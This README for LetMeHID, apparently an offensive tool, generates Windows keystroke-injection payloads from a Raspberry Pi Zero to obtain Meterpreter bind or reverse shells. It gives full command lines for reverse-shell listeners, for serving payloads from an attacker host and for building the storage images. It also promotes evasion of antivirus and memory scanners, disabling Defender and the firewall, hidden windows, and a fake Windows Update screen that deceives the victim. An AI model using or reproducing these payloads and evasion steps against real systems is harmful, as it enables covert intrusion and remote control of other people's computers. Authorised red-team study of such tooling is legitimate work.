# LetMeHID

LetMeHID is a tool that generates Windows HID payloads to obtain bind or reverse access using Raspberry PI0 and P4wnP1 A.L.O.A.

It implements various techniques to deliver and execute the payload (direct on keyboard, download and execute, using PI0 external device), it has a low detection rate from Antivirus softwares (avoiding uploading to VirusTotal could help keep it in that way...) and it is highly configurable.

**Bonus: This tool could be useful also if you are not interested in HID devices. During a penetration test if you have a command execution or a shell access, you can copy and paste commands generated by LetMeHID to easy obtain a bind/reverse Meterpreter shell :)**

## Related projects

LetMeHID is based on the following projects:
- [P4wnP1 A.L.O.A. by MaMe82](https://github.com/RoganDawes/P4wnP1_aloa), a framework which turns a Rapsberry Pi Zero W into a flexible, low-cost platform for pentesting, red teaming and physical engagements ... or into "A Little Offensive Appliance".
- [letmein.ps1 by raptor](https://github.com/0xdea/tactical-exploitation/blob/master/letmein.ps1), a PowerShell Stager for Metasploit Framework
- [Metasploit Framework by rapid7](https://github.com/rapid7/metasploit-framework), that everybody knows (or you are in the wrong place...)

## How does it work

LetMeHID generates Windows payloads ready to be executed with P4wnP1 A.L.O.A. Generated payloads can be executed on target Windows system in order to try to obtain a bind or reverse access using Metasploit Meterpreter.

The Meterpreter Stager that is executed by LetMeHID is raptor letmein.ps1, a pure PowerShell Stager that is perfect for the purpose. The stager on his own has a very low detection rate but has been further compressed and modified in order to be as stealth as possible. Furthermore, with "direct" and "downloadAndExecute" modes (explained later) the stager is never stored on the filesystem (it is downloaded and processed only in memory) and consequently can be detected only by security tools that inspect the memory at runtime.

If you want to achieve an event greater degree of Antivirus elusion, you can sobstitute the bind and reverse stagers (that are stored outsite LetMeHID script) with custom ones (pay attention to the payload length because there are limitations on command length in powershell). You can also obfuscate meterpreter metsrv.dll, because many software that ispect the memory (like CrowdStrike) block meterpreter when the DLL is received from stager.

## Modes of operation

LetMeHID generates the following types of payloads:

- direct: the payload is typed directly by the keyboard (longer but does not requires anything to work)
- downloadAndExecute: the payload is downloaded from the attacker machine (proxy and proxy credentials supported) directly into the memory (without downloading to the filesystem) and executed from memory (faster but require a connection from target)
- executeFromSd: the payload is executed from the external memory or external CD rom emulated from the Raspberry PI0 (faster but adds an external memory or external CD rom to target, that can be suspicious/detected...)

## Starting modes

One of the crucial points of HID payloads is when the payloads should start (see [README of P4wnP1 A.L.O.A. for further detauls](https://github.com/mame82/P4wnP1_aloa)):

- now: the payloads starts immediately (good for debugging purposes but not for real life situations: the execution of the payload will probably start before the fake keyboard is properly installed by target operating system)
- waitLED: the payload starts when the keyboard is installed by the operating system
- waitLEDRepeat: the payload starts after pressing multiple time NUM LOCK, SCROLL LOCK or CAPS LOCK (useful when you want to manually start the payload)
- delay: fixed delay before starting (should be tuned to avoid the start of the payload before the fake keyboard is properly installed by target operating system)

## Addictional features

Some juicy features has been added to LetMeHID in order to increase the success of the attack or to fake a real process:

- Payloads support also PowerShell 2.0
- Payloads use "-windowstyle hidden" option of PowerShell that put the PowerShell window in background 
- "fakeLegitProcess" option executes a custom command after the payload, in order to simulate a legit process like and AntiVirus update that spawns terminals. With this option, the default command opens the Windows Update page of the Control Panel (but can be changed)
- Admin mode tries to open a PowerShell terminal with administrative privileges (there is a delay of 5 seconds because the UAT popup can require more time to show up)
- "disableDefender" and "disableFirewall" options try to disable Windows Defender and Windows Firewall (admin mode only)

## Examples

### Download and execute (best option if the HTTP/HTTPS connections from victim to us are not blocked)

**Full command:**  
python LetMeHID.py --layout it --attack downloadAndExecute --start waitLED --httpServerAddress 192.168.1.254 --httpServerPort 8485 --type reverse --port 8484 --ipRevListener 192.168.1.254 --generatePayload --fakeLegitProcess

**Details:**  
python LetMeHID.py --layout it --attack downloadAndExecute  ->  *Italian keyboard layout, downloadAndExecute attack*  
--start waitLED  ->  *Start when the keyboard is installed by the system*  
--httpServerAddress 192.168.1.254 --httpServerPort 8485  ->  *The payload will be served at 192.168.1.254:8485, default path /enc_pay.txt, default protocol HTTP*  
--type reverse --port 8484 --ipRevListener 192.168.1.254  ->  *Reverse shell payload, Meterpreter listener at 192.168.1.254:8484*  
--generatePayload  ->  *Generate payload that must be copied in the server web to ./enc_pay.txt*  
--fakeLegitProcess  ->  *Simulate a legit process by executing a program after the payload. Default program Windows Update page of the Control Panel*  

**Pre-requisites:**  
\# Set up a web server  
mkdir /tmp/webserver/  
cp ./enc_pay.txt /tmp/webserver/  
cd /tmp/webserver/  
python2 -m SimpleHTTPServer 8485  

#### Direct execution (this attack does not require anything but print a lot of thing on powershell and consequently is more detectable)

**Full command:**  
python LetMeHID.py --layout it --attack direct --start waitLED --type bind --port 5555 --admin --disableDefender  

**Details:**  
python LetMeHID.py --layout it --attack direct  ->  *Italian keyboard layout, direct attack*  
--start waitLEDRepeat  ->  *the payload starts after pressing multiple time NUM LOCK, SCROLL LOCK or CAPS LOCK*  
--type bind --port 5555  ->  *Bind shell payload, Meterpreter listener at local port 5555*  
--admin --disableDefender  ->  *Try to run powershell as Administrator* and then to disable Defender before running meterpreter payload*  

### Execute from PI0 internal SD card or CD Rom drive

**Full command:**  
python LetMeHID.py --layout it --start fixedTime --fixedTime 60000 --attack executeFromSd --driveName Keyboard --type reverse --port 8484 --ipRevListener 192.168.1.254 --generatePayload --fakeLegitProcess  

**Details:**  
python LetMeHID.py --layout it --attack executeFromSd ->  *Italian keyboard layout, executeFromSd attack*  
--start fixedTime --fixedTime 60000  ->  *Run payload after 60 seconds*  
--driveName Keyboard  ->  *The payload is retrieved from external drive/CD-rom named Keyboard, supplied from PI0, default file name enc_pay.txt*  
--type reverse --port 8484 --ipRevListener 192.168.1.254  ->  *Reverse shell payload, Meterpreter listener at 192.168.1.254:8484*  
--generatePayload  ->  *Generate payload that must be copied in the server web to ./enc_pay.txt*  
--fakeLegitProcess  ->  *Simulate a legit process by executing a program after the payload. Default program Windows Update page of the Control Panel*  

**Pre-requisites for an external drive:**  
\# It is necessary to generate the image for the external storage that will be created by the PI0. P4wnP1 offers a tool named genimg for the task  
scp enc_pay.txt root@172.24.0.1:/tmp/  
ssh root@172.24.0.1  
mkdir /tmp/sdcard/  
mv /tmp/enc_pay.txt /tmp/sdcard/  
cd /tmp/sdcard/  
/usr/local/P4wnP1/helper/genimg -l Keyboard -s 32 -i /tmp/sdcard/ -o sd_met  
\# Now go the P4wnP1 A.L.O.A. web page, USB Settings, enable "Mass Storage", click on the option arrow and select "sd_met" in "Image file to use", Confirm and Deploy  

**Pre-requisites for a CD-ROM drive:**  
\# It is necessary to generate the image for the external storage that will be created by the PI0. P4wnP1 offers a tool named genimg for the task  
scp enc_pay.txt root@172.24.0.1:/tmp/  
ssh root@172.24.0.1  
mkdir /tmp/cdrom/  
mv /tmp/enc_pay.txt /tmp/cdrom/  
cd /tmp/cdrom/  
/usr/local/P4wnP1/helper/genimg -c -l "Keyboard" -i /tmp/cdrom/ -o cd_met  
\# Now go the P4wnP1 A.L.O.A. web page, USB Settings, enable "Mass Storage", click on the option arrow, enable "CD-Rom" and select "cd_met" in "Image file to use", Confirm and Deploy
